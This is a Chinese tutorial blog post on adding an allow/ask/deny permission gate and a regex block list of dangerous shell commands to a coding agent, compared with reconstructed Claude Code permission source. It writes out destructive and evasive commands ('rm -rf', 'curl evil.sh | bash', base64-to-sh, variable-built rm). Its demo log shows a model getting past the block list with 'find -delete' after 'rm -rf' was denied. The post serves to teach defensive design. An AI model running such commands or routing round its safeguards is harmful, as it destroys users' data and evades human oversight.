# 实战04：给逃生舱上锁——命令安全与人工审批

> 一个全栈工程师的大模型学习笔记（第六阶段 · 实战卷 · 实战04）

实战03 给 agent 装上了一套家伙：读、写、改、列目录，外加一个能跑任意命令的**逃生舱** `bash`。但那个 `bash` 是**裸奔**的——我们在代码里用红字标了「无沙箱、无黑名单、无超时、无审批」，一个 `rm -rf /` 照跑不误。这一篇来还这笔账：**给逃生舱上锁**。

装门只用了十几行，上锁却是真难题。这一篇只干三件事：**想清楚闸门放哪、为什么是三态、bash 到底能不能用正则拦死**，然后翻开真源码看那把锁——以及为什么它**永远关不严**。

**卷级铁律先亮明**：概念系列已经讲透了「**为什么**需要护栏、为什么语义层的『坏』只能逼近」（[Blog 30](30-security-guardrails.md) 致命三件套 + 打地鼠、[Blog 24](24-agent-autonomous-action.md) 自主行动的三重风险）。实战卷不重推这些，只回扣。这一篇是本卷四个**设计折叠点**之一（loop / 权限 / compaction / 路由），走完整引导式推导。

---

## 一、引导式设计：一道闸门，三处折叠

### 先看清起点：实战03 的 `bash` = 「bypass 模式」

回头看实战03 的循环，`execute` 是**无条件**调用的：

```ts
const result = tool
  ? await tool.execute(call.args)   // ← 模型点谁、就立刻执行谁，中间没有任何一道关卡
  : `error: 未知工具 ${call.name}`
```

模型吐一个 `bash({command:"rm -rf /"})`，这行代码眼睛都不眨就把它丢进 shell。用真源码的话说，实战03 整个跑在 **bypassPermissions 模式**——「绕过一切权限」。这一篇要做的，就是在 `execute` 前面**插一道闸门**，把默认模式从「裸奔」改回「先问一句」。

先给一张全局地图看本章动了哪：循环骨架、provider 层、五个工具全沿用实战02/03（灰），本章新增的只有 `execute` 前那**一道闸门** `permission.ts`——所有工具调用都从这个针眼里穿过。

![实战04 骨架定位图：调用方 index.ts 进入 runAgent 循环（灰色虚线框，实战02/03 已有：①chat ②模型点名工具 ③空则 return），循环经 provider 层连到双端 API（灰色）；底部 allTools[] 五个工具（灰色，实战03 已有）。本章唯一新增是深色高亮框：在「模型点名工具」和「execute」之间插入的权限闸门 permission.ts——每次工具调用都先过闸门，闸门吐三态 allow/ask/deny，allow 直接 execute、ask 弹给人拍板、deny 不执行把拒绝回灌模型。红字标注：闸门放在 loop 的 execute 前，是所有工具调用的唯一收口，一处覆盖全部工具](assets/img/实战04-skeleton.svg)

那这一篇的脑力花在哪？花在三个**别当成机械劳动**的地方。

### 折叠点①：闸门放进「每个工具」，还是放在「loop 一处」？

直觉一：既然是 `bash` 危险，那就在 `bash.ts` 的 `execute` 开头自己检查一下命令安不安全，不安全就拒。**每个工具管好自己。**

这条路能走，但会漏、会重。想想 `write_file`——它也危险（能覆写 `~/.zshrc`）；`edit_file` 也是；将来加的每一个能改东西的工具都得**各自再写一遍**「要不要问、怎么问、怎么记住用户说过的允许」。安全逻辑会**散落在 N 个工具里**，加一个工具就多一个可能忘记上锁的口子。

直觉二（更好）：**闸门放在 loop 的 `execute` 前面**——因为 loop 里那一行 `tool.execute(call.args)` 是**所有工具调用的唯一收口**。模型点名任何工具，最后都从这个针眼穿过。在这里插一道关卡，**一处覆盖全部工具**：

```ts
// 收口：不管什么工具，先过闸门再决定要不要真 execute
const result = await runWithGate(tool, call.args, session, gate)
```

这不是我们的发明——真源码正是这么分工的：权限判定函数 `hasPermissionsToUseTool`（一个 `CanUseToolFn`）**由 loop 调**，在工具执行前统一裁决，而不是每个工具自查（翻源码一节验证）。工具只管「我是谁、我干什么」，「准不准我干」交给闸门。**关注点分离**在这里落地：工具是能力，闸门是权限。

这正是你写后端时的老经验——权限校验不抄进每个 controller，挂一个中间件在所有危险路由前：

![实战04 折叠点①：闸门放哪。左侧✗「装进每个工具自查」——bash.ts/write_file.ts/edit_file.ts 各带一份🔒自查逻辑，第 N 个工具还得再写一遍，红框标注「安全逻辑散落 N 处，加工具就多一个可能忘记上锁的口子」。右侧✓「loop 一处收口（中间件式）」——每次工具调用(read_file/list_dir/write_file/edit_file/bash)全部穿过唯一一道闸门 checkPermission()，放行才 execute，加工具安全零改动，像中间件挂在所有危险路由前。底部收口：工具管「能力」、闸门管「权限」——关注点分离；真源码同款 hasPermissionsToUseTool(CanUseToolFn) 由 loop 调、不是每工具自查；loop 里 tool.execute() 那一行是所有工具调用的唯一收口，闸门插它前面一处覆盖全部](assets/img/实战04-gate-placement.svg)

### 折叠点②：为什么是三态 `allow / ask / deny`，不是两态？

最省事的设计是**两态**：安全就 `allow`，危险就 `deny`。写个判断，一刀切。

但你马上会撞上一个死结——**大量操作卡在中间，两态都放不下**：

- `write_file` 往工作区写个 `hello.txt`：算安全吗？多半是。但万一路径是 `~/.ssh/authorized_keys` 呢？
- `bash("npm test")`：安全吗？通常是。但 `npm test` 会跑 `package.json` 里任意脚本，谁知道那脚本干什么。
- `bash("git push")`：这不危险，但**不可逆**、会影响远端——你未必想让 agent 自作主张推。

这些操作**不是非黑即白**。两态强行归类的后果是：归到 `allow`——你把「大概安全」当「一定安全」放行了，赌输一次就是 `~/.ssh` 被覆写；归到 `deny`——你把一个**本来能干的活**一刀切死，agent 废了半条命。

死结的出口，是承认「安不安全」这件事**有一个模糊的中间地带**，而这个地带**只有人能判**——因为它取决于**意图**（回扣 [Blog 30](30-security-guardrails.md)：语义层的「意图坏不坏」是打地鼠，确定性代码判不了）。所以加**第三态 `ask`**：

> **闸门的职责不是「判定安全 / 危险」，而是「把模糊的中间地带，路由给唯一能拍板的人」。**

- `allow`：确定无害（只读工具 `read_file`/`list_dir`）→ 直接放行，不打扰人。
- `deny`：一眼致命（`rm -rf`、`curl | sh`）→ 硬拒，连问都不问，把拒绝**回灌**给模型（响亮失败，回扣实战03）。
- `ask`：拿不准（写文件、跑 shell）→ **弹给人**：允许一次 / 本会话总是允许 / 拒绝。

三态之间还有一条**精度顺序**：**`deny` 压过 `ask`、`ask` 压过 `allow`**。为什么往这个方向收？因为闸门的每一次「拿不准」，都应该倒向**更保守**的那一侧——宁可多问一句（ask），也不要少拦一次（把该 deny 的放成 allow）。冲突时选更安全的那个，是安全系统的默认姿态。

这套决策，画成流程就是本章的主图：

![实战04 控制流程图（主图）：一次工具调用 tool+args 进入闸门 checkPermission，顺 4 道守卫往下走。①会话已『总是允许』此工具？是→allow。②只读工具(read_file/list_dir)？是→allow（绿，直接放行不打扰人）。③bash 命中致命黑名单(rm -rf/curl|sh 等)？是→deny（红）。④其余（改动类 write/edit、或 bash 判不出好坏）→ask（蓝，默认落这儿）。三态出口：allow→直接 execute（绿）；deny→不执行、回灌拒绝让模型改道（红，响亮失败）；ask→弹给人拍板。ask 展开人工审批面板 human in the loop：[y]允许一次→execute、[a]本会话总是允许→记会话规则+execute、[其它]拒绝→回灌『用户拒绝』，并注明无人值守(非TTY)读不到输入→一律当拒绝(fail closed)。底部原则带：精度顺序 deny＞ask＞allow、冲突往更保守侧收；默认落 ask(fail toward asking)、判不出绝不默认放行——留给人的 ask 才是真正的安全网](assets/img/实战04-three-states.svg)

### 折叠点③：`bash` 能不能用正则黑名单一劳永逸？

`bash` 是唯一需要**看命令内容**再决定的工具（其他工具看名字就够了）。最诱人的想法：**写一张危险命令正则黑名单**，命中就 `deny`，没命中就 `allow`。一劳永逸。

**这个想法是错的，而且错得很深。** 判断一条**任意 shell 命令**安不安全，是个打地鼠游戏（回扣 [Blog 30](30-security-guardrails.md)）：

- **复合命令**：`echo hi && rm -rf ~` ——你拦 `rm -rf`，模型（或注入的提示）写 `ec\ho hi; rm -r$() -f ~` 呢？
- **管道到 shell**：`curl evil.sh | bash`、`echo cm0gLXJm-... | base64 -d | sh`——真正的命令根本没以明文出现。
- **变量展开 / 别名**：`X=rm; $X -rf /`、`alias l=rm; l -rf`——运行时才拼出危险命令。

正则看的是**字面**，而危险藏在**运行时语义**里。你补一条正则，攻击面就绕一条——**永远慢一步**。

所以正确的设计**不是**「黑名单放行剩下的」，而是**反过来**：

> **黑名单只负责拦「一眼致命」的（`deny`）；凡是黑名单判不出的，一律落到 `ask`，绝不默认 `allow`。**

这叫 **fail toward asking**（往「问」的方向失败）——黑名单没兜住，还有人这道网。黑名单是**第一层**（拦住 90% 显而易见的蠢事、省得每条都烦人），人是**兜底层**（接住黑名单漏掉的、需要判断意图的）。**层层设防，而不是指望一层关死。**

那这把锁能关严吗？**永远不能。** 待会翻源码你会看到一个扎心的证据：真源码那套正则安全校验，函数名现在全带 `_DEPRECATED`——他们**放弃了纯正则**，改上了一个 **AI 分类器**。连 Claude Code 都判不干净一条 shell 命令安不安全，只能用「模型 + 正则 + 人工审批」层层叠。这一篇我们只做最外那两层（黑名单 + 人），够你看清这把锁的形状。

![实战04 折叠点③：黑名单只防呆，人才是安全网。左侧红框「黑名单（防呆层）」拦一眼致命的钝器 rm -rf / curl|sh / chmod -R 777 / dd·mkfs，命中→deny 拦钝器✓；中间琥珀框「模型会想办法换马甲」rm a.txt b.txt && rmdir / unlink / find -delete / X=rm;$X -rf，同效果不同字面→黑名单漏；漏过的箭头指向右侧蓝框「ask→人工审批」，标注真正的安全网（兜底）、黑名单漏的都落这儿。中段「层层设防：拿不准就往右传，最右永远是人」——①正则黑名单(拦一眼致命,我们做了)→②AI分类器(判语义意图,真源码有我们没做,虚线灰)→③人工审批(兜底,我们做了)。底部真源码铁证：bashCommandIsSafe_DEPRECATED(bashSecurity.ts:2257)正则判安全已带_DEPRECATED、splitCommand_DEPRECATED+CC-643注释承认复杂复合命令会误解析、改上AI分类器；判一条任意 shell 命令安不安全=打地鼠、永远关不严（回扣 Blog30）](assets/img/实战04-lock.svg)

---

## 二、代码落地

新增一个文件 `src/permission.ts`（闸门），改一处 `src/loop.ts`（收口）。工具本身**一个字不改**——权限不是工具的事。

### 闸门本体：三态决策

```ts
// src/permission.ts
export type Decision =
  | { behavior: 'allow' }
  | { behavior: 'deny'; reason: string }
  | { behavior: 'ask'; reason: string }

const READONLY = new Set(['read_file', 'list_dir'])   // 只读：默认放行

// bash「一眼致命」黑名单——只拦显而易见的，判不出的落 ask（回扣 Blog30 致命三件套）
const DANGEROUS: { pattern: RegExp; why: string }[] = [
  { pattern: /\brm\s+(?:\S+\s+)*(?:-\w*[rR]\w*|--recursive)/,         why: 'rm 递归删除（-r/-rf）' },
  { pattern: /:\s*\(\)\s*\{[^}]*\|[^}]*&[^}]*\}\s*;/,                 why: 'fork 炸弹' },
  { pattern: /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(bash|sh|zsh)\b/,    why: '下载脚本直接管道执行' },
  { pattern: /\bdd\b[^\n]*\bof=\/dev\//,                             why: 'dd 写入裸设备' },
  { pattern: />\s*\/dev\/(sd|nvme|disk)/,                            why: '覆写磁盘设备' },
  { pattern: /\bchmod\s+-R\s+777\b|\bchmod\s+777\s+-R\b/,            why: 'chmod -R 777 放开全部权限' },
  { pattern: /\bmkfs\.?\w*\b/,                                       why: '格式化文件系统' },
]

export function checkPermission(tool: Tool, args: any, session: SessionRules): Decision {
  if (tool.name !== 'bash' && session.allowTools.has(tool.name)) return { behavior: 'allow' }
  if (READONLY.has(tool.name)) return { behavior: 'allow' }                 // 只读 → 放行

  if (tool.name === 'bash') {
    const cmd = String(args?.command ?? '')
    for (const rule of DANGEROUS)                                           // 命中致命 → 硬拒
      if (rule.pattern.test(cmd)) return { behavior: 'deny', reason: `命令疑似危险（${rule.why}）` }
    if (session.allowBashPrefix.has(bashPrefix(cmd))) return { behavior: 'allow' }
    return { behavior: 'ask', reason: `将执行 shell 命令：${cmd}` }           // 判不出 → 问人
  }
  return { behavior: 'ask', reason: `${tool.name} 将改动 ${args?.path ?? '文件系统'}` }  // 会改东西 → 问人
}
```

> 两个坑先标：① 那条 `rm` 正则只拦**带 `-r/-R` 的递归删除**（`rm -rf`、`rm -Rf`、`rm -r`、`rm --recursive`），**放过** `rm -f a.txt`、甚至 `rm report.txt`（`[rR]` 必须落在 `-` 开头的选项里，否则含 r 的裸文件名会被误伤——早期版本写成 `-?\w*[rR]` 就把 `rm report.txt` 也拦了，这是审核抓出的真 bug）。放过的这些是「非递归、有界」的删除，落到 `ask` 让人判。② 它**必然漏**——待会 demo 里模型就用一个**完全不同的命令** `find … -delete` 绕过了它。黑名单只拦一眼致命的钝器，模糊/换皮的交给人，本就是设计如此。

### 会话级「总是允许」与人工审批

人在审批时选「本会话总是允许」，就把这个工具（或 bash 命令前缀）记进一个**只活在本次运行**的集合，下次同类不再问（回扣真源码：`ask` 决策带 `suggestions`，选 always = 把规则 addRules 到 `session` 这个不落盘的目的地）：

```ts
export type SessionRules = { allowTools: Set<string>; allowBashPrefix: Set<string> }

// 取命令的稳定前缀（命令+子命令两词）当匹配键（回扣真源码 getSimpleCommandPrefix：Bash(npm test:*)）
function bashPrefix(cmd: string): string {
  return cmd.trim().split(/\s+/).slice(0, 2).join(' ')   // "npm test --watch" → "npm test"
}

export type Approval = 'yes' | 'always' | 'no'
export async function askHuman(reason: string): Promise<Approval> {
  // 无人值守（非 TTY / 脚本）读不到输入 → 一律当拒绝：宁可不做，不误做（fail closed）
  const forced = process.env.AUTO_APPROVE?.trim().toLowerCase()
  if (forced === 'yes' || forced === 'always' || forced === 'no') { /* …脚本化演示用… */ return forced }
  const ans = (globalThis.prompt(`\n⛔ 需要授权：${reason}\n   [y] 允许一次  [a] 本会话总是允许  [其它] 拒绝 > `) ?? '')
    .trim().toLowerCase()
  return ans === 'y' || ans === 'yes' ? 'yes' : ans === 'a' || ans === 'always' ? 'always' : 'no'
}
```

### loop 收口：三态各走一条路

`loop.ts` 把裸调 `tool.execute` 换成过闸门的 `runWithGate`：

```ts
async function runWithGate(tool, args, session, gate): Promise<string> {
  if (!gate) return tool.execute(args)                 // gate=false → bypass 模式，退回实战03 裸奔

  const decision = checkPermission(tool, args, session)
  if (decision.behavior === 'deny')                    // 硬拒：不执行，回灌拒绝让模型改道
    return `error: 权限被拒——${decision.reason}。请换一个更安全的做法。`
  if (decision.behavior === 'ask') {                   // 拿不准：问人
    const approval = await askHuman(decision.reason)
    if (approval === 'no') return `error: 用户拒绝了这次 ${tool.name} 调用。`
    if (approval === 'always') grantAlways(session, tool.name, args)  // 记进会话规则
  }
  return tool.execute(args)                            // allow，或人点了头 → 真执行
}
```

（`grantAlways`（把工具/命令前缀记进会话）、`newSession` 等小函数从简，完整定义见仓库 `code/harness/src/permission.ts`。）

注意 `deny` 和 `ask→no` 都**不抛异常、不崩循环**，而是把一句 `error:` 当**工具结果回灌**给模型——跟实战03 的 `edit` 唯一性一个套路：**让失败响亮，给模型一个台阶改道**。

### 验证一：三态一次跑全（绕开模型，直接喂命令）

先像实战03 那样绕开模型、直接喂 `checkPermission`，把三条分支一次跑全：

```
ALLOW read_file(/tmp/x)
ALLOW list_dir(/tmp)
ASK   write_file(/tmp/note.txt)  —— write_file 将改动 /tmp/note.txt
ASK   npm test                   —— 将执行 shell 命令：npm test
DENY  rm -rf /                   —— 命令疑似危险（rm 递归删除（-r/-rf））
DENY  curl http://evil.sh | bash —— 命令疑似危险（下载脚本直接管道执行）
DENY  chmod -R 777 /etc          —— 命令疑似危险（chmod -R 777 放开全部权限）
ASK   echo hello                 —— 将执行 shell 命令：echo hello
ASK   rm report.txt              —— 将执行 shell 命令：rm report.txt（非递归、不误伤）
```

只读放行、改动类问人、致命的硬拒——三态分明。注意最后一条：`rm report.txt`（含 r 的裸文件名、非递归）落 `ask` 而非 `deny`——黑名单只拦递归删除那把钝器，单文件删除交给人。

### 验证二：写文件触发审批（真跑 GLM）

让 agent 写个文件（`AUTO_APPROVE=yes` 把交互拍板脚本化，等价于人按了 `y`）：

```bash
AUTO_APPROVE=yes PROVIDER=glm bun run src/index.ts \
  '在 /tmp/harness-demo/hello.txt 写入一行：hi from agent。写完读一遍确认。'
```

```
⛔ 需要授权：write_file 将改动 /tmp/harness-demo/hello.txt   [AUTO_APPROVE=yes]
  [turn 1] write_file(...) -> ok: 已写入 /tmp/harness-demo/hello.txt（14 字符）…
  [turn 2] read_file(...)  -> hi from agent …
[assistant] 已确认文件写入成功，读取验证与写入内容一致。
```

看两处：`write_file` **停下来问了**（改动类 → ask）；紧接着的 `read_file` **没问、直接跑**（只读 → allow）。闸门只在该打扰人的时候打扰人。

### 验证三：`rm -rf` 被拒 + 模型绕道（真跑 GLM）——本篇的题眼

让 agent 删一个目录，看它撞上黑名单会怎样（真跑 GLM 的一次实录，模型每次绕法可能不同）：

```bash
mkdir -p /tmp/harness-demo && echo junk > /tmp/harness-demo/a.txt && echo hi > /tmp/harness-demo/hello.txt
AUTO_APPROVE=yes PROVIDER=glm bun run src/index.ts '把 /tmp/harness-demo 目录整个删掉，用最直接的办法。'
```

```
  [turn 1] bash({"command":"rm -rf /tmp/harness-demo"})
           -> error: 权限被拒——命令疑似危险（rm 递归删除（-r/-rf））。请换一个更安全的做法。
⛔ 需要授权：将执行 shell 命令：find /tmp/harness-demo -delete   [AUTO_APPROVE=yes]
  [turn 2] bash({"command":"find /tmp/harness-demo -delete"}) -> （命令无输出，退出码 0）
⛔ 需要授权：将执行 shell 命令：ls /tmp/harness-demo 2>&1 || echo "目录已删除"   [AUTO_APPROVE=yes]
  [turn 3] bash({"command":"ls /tmp/harness-demo 2>&1 || echo \"目录已删除\""})
           -> ls: /tmp/harness-demo: No such file or directory  目录已删除
[assistant] 已成功删除 /tmp/harness-demo 目录。
```

把这三步用时序看一遍——**模型被拒后自己改道，一步就找到黑名单没盖住的缝**：

![实战04 序列图：runAgent 闸门、模型、人/文件系统三条泳道，演示 rm -rf 被拒后模型换马甲绕过黑名单、落 ask 被人接住。beat1 模型请求 bash『rm -rf dir』→ 闸门命中黑名单直接 deny（红，不问人）→ 回灌『权限被拒，请改道』；beat2 模型换一个完全不同的命令 bash『find dir -delete』（同样递归删除、但黑名单里没这条）→ 落 ask → 人批准 → execute 成功（退出码 0）；beat3 模型请求 bash『ls dir …』核对 → 落 ask → 人批准 → 『目录已删除』。底部红字点破题眼：黑名单拦住了钝器 rm -rf，但模型用 find -delete 这条语义等价、字面全不同的命令绕了过去——黑名单根本没它，只能落到 ask，人是最后一道闸。这把锁关不严，只能层层设防](assets/img/实战04-sequence.svg)

**这就是本篇的题眼**：`rm -rf` 被黑名单一把拦下（turn 1，钝器好拦）；可模型转头用 `find … -delete`——**一个完全不同的命令**，同样把整个目录递归删掉（turn 2）。这条命令黑名单里**根本没有**，于是它落到了 `ask`。

换句话说：**黑名单拦得住「一眼致命的字面」，拦不住「换个命令的语义等价」。** 真正接住这一刀的，是 `ask` 那道**人工审批**。折叠点③说的「fail toward asking、层层设防」，在这里活生生演了一遍——你要是当初图省事写成「黑名单没命中就 allow」，turn 2 就静默把目录删了，没有任何人看见。

> 诚实一句：这个 demo 全程 `AUTO_APPROVE=yes`（等价于人一路按 `y`），所以它证明的是**「该问的都问了」——`ask` 被正确触发**，而不是「人真的拒了」。真正的「接住」发生在人按下拒绝的那一刻；闸门只保证把决定权交到了人手上。

当篇 checkpoint：`git tag harness-ch04-permission-gate`。

---

## 三、🔬 翻开源码：三态、精度顺序，与那把关不严的锁

打开还原源码 `claude-code-rev`，权限系统在 `src/utils/permissions/`。

### 三态与精度顺序——我们的骨架，就是它的骨架

三态**一字不差**（`src/types/permissions.ts`）：

```ts
export type PermissionBehavior = 'allow' | 'deny' | 'ask'
```

精度顺序在 `permissions.ts:1071` 的 `checkRuleBasedPermissions`，注释编号 `1a→1b→1c→1d→1f` 把优先级写得明明白白：

```ts
// 1a. 整个工具被 deny 规则禁掉 → 直接 deny（最高优先级）
const denyRule = getDenyRuleForTool(...);  if (denyRule) return { behavior: 'deny', ... }
// 1b. 整个工具有 ask 规则 → ask
const askRule = getAskRuleForTool(...);    if (askRule) return { behavior: 'ask', ... }
// 1c. 工具自己的细粒度判定（bash 子命令规则等）
const toolPermissionResult = await tool.checkPermissions(parsedInput, context)
// 1d. 工具实现判 deny → deny
if (toolPermissionResult?.behavior === 'deny') return toolPermissionResult
// 1f. 内容级 ask 规则（如 Bash(npm publish:*)）压过 bypass 模式
```

**deny 永远第一个被检查、ask 在 allow 之前**——跟我们折叠点②那条「deny > ask > allow，往保守侧收」是同一个精度顺序。我们把它压成三个 `if`，它铺成一条带编号的责任链，**骨架同形**。

而「闸门由 loop 调、不是每工具自查」也实锤了：裁决入口 `hasPermissionsToUseTool`（`permissions.ts:473`）的类型就是 `CanUseToolFn`——由 loop 在执行工具前统一调用。折叠点①那条推理是源码的分工，不是我编的。

至于「总是允许」：真源码的 `ask` 决策（`PermissionAskDecision`）带一个 `suggestions: PermissionUpdate[]` 字段，UI 上就是那几个「Yes / Yes, and don't ask again for X / No」按钮；选了「don't ask again」就把一条规则 `addRules` 到某个 `destination`（`session` / `localSettings` / `projectSettings`…）。我们只做了最易失的 `session` 那一档——不落盘、只活在本次运行。

**模式**也对得上：真源码有 `default / acceptEdits / bypassPermissions / dontAsk / plan` 五种模式（`types/permissions.ts`）。我们的 `gate=true` 约等于 `default`，`gate=false` 就是 `bypassPermissions`（实战03 的裸奔态）。`dontAsk` 更绝——它在裁决末尾把所有 `ask` 强转成 `deny`（`permissions.ts:508`），「拿不准就别做」。

### bash 那把锁：一万行，且正在被放弃

我们的 bash 安全体检就一张七条的正则表。真源码 `src/tools/BashTool/` 那把锁逾万行。但比行数更扎心的是**两个函数名**：

| 真源码符号 | 位置 | 说明 |
|---|---|---|
| `splitCommand_DEPRECATED` | `bashPermissions.ts` | 把复合命令拆成子命令逐个判——名字带 `_DEPRECATED` |
| `bashCommandIsSafe_DEPRECATED` | `bashSecurity.ts:2257` | 正则判定命令安不安全——也带 `_DEPRECATED` |
| `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50` | `bashPermissions.ts:103` | 复合命令超 50 段就不逐个判、直接 fall back 到 `ask` |

`bashPermissions.ts:95` 那条 `CC-643` 注释说得更直白：复杂复合命令会把子命令数组**撑爆**（可能指数膨胀、ReDoS、把事件循环饿死到 REPL 卡死），所以砍到 **50 段封顶**，超了就**直接落 `ask`**——注释原文写着 *「safe default — we can't prove safety, so we prompt」*。这就是真源码里活生生的 **fail toward asking**。另一头，`splitCommand_DEPRECATED` 还会**误解析**某些命令（续行、shell 引号变换），源码专门留了个 `isBashSecurityCheckForMisparsing` 标记去兜（`types/permissions.ts`）。**判不准 + 判不动，两头都往 `ask` 兜**——因为它们知道正则这层靠不住。

那 `_DEPRECATED` 之后换成了什么？——一个 **AI 分类器**。`types/permissions.ts` 里多出一整段 `ClassifierResult` / `YoloClassifierResult` / `auto` 模式：拿不准的命令，交给一个小模型去判「这条命令的意图坏不坏」，判不了再落到人工审批。

**这就是折叠点③那句「锁永远关不严」的铁证**：连 Claude Code 都承认——**纯正则判不干净一条 shell 命令**（所以 `_DEPRECATED`），于是升级成「正则黑名单（拦一眼致命）→ AI 分类器（判语义意图）→ 人工审批（兜底）」的**层层设防**。我们这一篇做的是最外层的正则 + 人，中间那层分类器是真源码用一个模型补的——正好呼应 [Blog 30](30-security-guardrails.md)：**语义层的「坏」是打地鼠，只能逼近，永远关不严。**

**诚实标注降级**（卷首语声明一 / 三）：真源码那套我们剥得只剩骨头——规则配置系统（allow/deny/ask 三张规则表 + 六种来源 userSettings/projectSettings/…）、规则落盘与跨会话同步、路径校验（`BashTool/pathValidation.ts` 1303 行）、沙箱（`shouldUseSandbox.ts`）、AI 分类器、`sed -i` 就地改文件的单独解析……全省了。我们只留了教学骨架：**三态 + 一张黑名单 + 一个 ask**。差距本身就是最好的教学点——你现在看真源码那一万行，能一眼认出它在给哪层锁加固。

---

## 小结

- **闸门放在 loop 的 `execute` 前**（折叠点①）：那是所有工具调用的唯一收口，一处覆盖全部工具；工具管能力、闸门管权限，关注点分离。真源码同款——`hasPermissionsToUseTool` 由 loop 调，不是每工具自查。
- **三态而非两态**（折叠点②）：`allow`（无害放行）/ `deny`（致命硬拒 + 回灌）/ `ask`（拿不准交人）。闸门的职责不是判安全，是**把模糊的中间地带路由给人**。精度顺序 **deny > ask > allow**，冲突往保守侧收——与真源码 `checkRuleBasedPermissions` 的 `1a→1b→…` 同形。
- **bash 黑名单只拦一眼致命，判不出的一律 ask**（折叠点③）：**fail toward asking**。demo 里模型用 `find … -delete`（一个完全不同的命令）绕过了 `rm -rf` 黑名单、落到 ask——**黑名单拦钝器，人接住语义等价的绕道**。这把锁永远关不严：真源码正则校验已 `_DEPRECATED`、改用 AI 分类器，只能层层设防（回扣 [Blog 30](30-security-guardrails.md) 打地鼠）。
- 🔬 源码对照：三态 `PermissionBehavior`（`types/permissions.ts`）；精度顺序 `checkRuleBasedPermissions`（`permissions.ts:1071`）；闸门由 loop 调 `hasPermissionsToUseTool`（`:473`）；`ask` 带 `suggestions`= 总是允许；五种模式（我们的 `gate=false`=bypass）；`bashCommandIsSafe_DEPRECATED`（`bashSecurity.ts:2257`）已弃用、`CC-643` 把超 50 段的复合命令直接兜到 `ask`——都是「正则靠不住、只能层层设防」的铁证。

下一篇——**实战05《把 loop 重构成流式：让字一个个蹦出来》**：到目前为止，模型说完整段我们才看得到——一次 `chat()` 憋到底。这一篇要动主干：把实战02 定下的**非流式 loop 重构成流式**，让 token 一个个蹦出来、工具调用边收边解析（这是卷首语预告过的「重塑主干、不是加零件」那一刀）。
